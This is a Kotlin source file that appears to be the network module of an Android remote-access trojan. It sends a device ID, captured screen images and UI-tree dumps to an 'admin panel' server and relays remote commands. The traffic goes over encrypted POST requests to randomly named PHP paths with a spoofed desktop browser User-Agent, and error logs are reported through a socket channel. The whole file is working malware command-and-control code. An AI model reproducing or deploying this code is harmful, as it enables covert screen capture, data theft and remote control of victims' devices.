package com.xxx.zzz.socketsp

import com.xxx.zzz.aall.gsonllll.googlepp.Gsonq
import com.xxx.zzz.globp.CommonParamsvc
import com.xxx.zzz.globp.Constantsfd
import com.xxx.zzz.globp.SharedPreferencess
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.IOException
import java.io.InputStream
import java.net.ConnectException
import java.net.HttpURLConnection
import java.net.MalformedURLException
import java.net.URL
import java.util.*

object apiRequestHttpNm {

    private suspend fun doInBackground(url: String?, parametr: String?): String {
        var resultString = ""
        withContext(Dispatchers.IO) {
            try {
                val myURL = url
                var data: ByteArray?
                val `is`: InputStream?
                try {
                    data = parametr?.toByteArray(Charsets.UTF_8) ?: byteArrayOf()

                    val url = URL(myURL)
                    val conn = url.openConnection() as HttpURLConnection
                    conn.setRequestProperty("User-Agent", " Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36")
                    conn.requestMethod = "POST"
                    conn.doOutput = true
                    conn.doInput = true
                    conn.setRequestProperty("Content-Length", (data.size).toString())

                    val os = conn.outputStream
                    os.write(data, 0, data.size)
                    os.flush()
                    os.close()

                    conn.connect()
                    val responseCode = conn.responseCode
                    val baos = ByteArrayOutputStream()
                    if (responseCode == 200) {
                        `is` = conn.inputStream
                        val buffer = ByteArray(8192)
                        var bytesRead: Int
                        while (`is`.read(buffer).also { bytesRead = it } != -1) {
                            baos.write(buffer, 0, bytesRead)
                        }
                        data = baos.toByteArray()
                        resultString = String(data, Charsets.UTF_8)
                    } else {
                        resultString = ""
                    }
                } catch (e: MalformedURLException) {
                    IOSocketyt.sendLogs("", Gsonq().toJson(e.localizedMessage), "error")
                } catch (e: ConnectException) {
                    e.printStackTrace()
                } catch (e: IOException) {
                    e.printStackTrace()
                }
            } catch (e: Exception) {
                IOSocketyt.sendLogs("", Gsonq().toJson(e.localizedMessage), "error")
            }
        }
        return resultString
    }

    suspend fun vnc(vnc_image: String?, tree: String?): String {
        val data = JSONObject()
        val params = CommonParamsvc(SharedPreferencess.getAppContext()!!)
        data.put("uid", params.uid)
        data.put("command", "imgtr")

        tree?.let {
            data.put("vnc_tree", tree)
        }
        vnc_image?.let {
            data.put("vnc_image", vnc_image)
        }

        return if(vnc_image == null && tree == null) {
            ""
        } else {
            httpRequest(data.toString())
        }
    }

    suspend fun command(command: JSONObject): String {
        return httpRequest(command.toString())
    }

    private suspend fun httpRequest(parms: String?, url: String? = null): String {
        val URL = (url ?: SharedPreferencess.urlAdminPanel) + "/php/" + randomString(Random().nextInt(20) + 1) + ".php/"
        return sendRequest(URL, parms)
    }

    private fun randomString(length: Int): String {
        val chars = "qwertyuiopasdfghjklzxcvbnm1234567890"
        val rand = Random()
        val buf = StringBuilder()
        for (i in 0 until length) {
            buf.append(chars[rand.nextInt(chars.length)])
        }
        return buf.toString()
    }

    private suspend fun sendRequest(url: String?, parametr: String?): String {
        val param = com.xxx.zzz.clipherp.Cryptorpo.encrypt(parametr ?: "", Constantsfd.k)
        val out = doInBackground(url, param)
        return try {
            com.xxx.zzz.clipherp.Cryptorpo.decrypt(out, Constantsfd.k)
        } catch (x: Exception) {
            ""
        }
    }

}